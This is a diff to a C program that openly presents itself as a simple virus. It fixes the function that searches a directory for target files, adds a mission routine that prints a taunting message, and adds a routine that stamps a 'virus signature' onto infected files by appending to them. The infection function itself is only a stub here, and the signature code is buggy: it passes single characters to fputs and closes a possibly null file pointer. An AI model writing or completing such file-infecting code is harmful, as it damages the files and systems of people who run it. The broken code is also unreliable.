@@ -145,7 +145,7 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
         -----------------------------------------------------------------------------------
 	 */
 
-	DIR *my_directory=path_to_target_directory;
+	DIR *my_directory=opendir(path_to_target_directory);
 
 	if(my_directory==NULL)
 	{
@@ -185,12 +185,31 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 
 	void execute_virus_mission()
 	{
-
+		puts("Hello, I am a simple virus. Yet, I can be deadly. Did you have your medicine today??");
 	}
 
+	// I stamp any infected file so that one can recognize it later against the healthy ones. Day Z zombie day, right??
 	void stamp_the_infected_file(char *file_name, char *virus_signature)
 	{
+		FILE *pFile=fopen(file_name,"ab"); //"ab" goes for 'append binary..."
 
+		if(!pFile)
+		{
+	#ifdef DEBUGMODE
+			perror("Error when creating file pointer.");
+	#endif
+		}
+		else
+		{
+			int i;
+			for(i=0;i<strlen(virus_signature);i++)
+			{
+				fputs(virus_signature[i],pFile);
+			}
+		}
+
+		fclose(pFile);
+		pFile=NULL;
 	}
 
 	int go_infect_the_target_file(char *target_file_name,char *virus_binary_file_name, long size_of_virus, long length_of_signature)
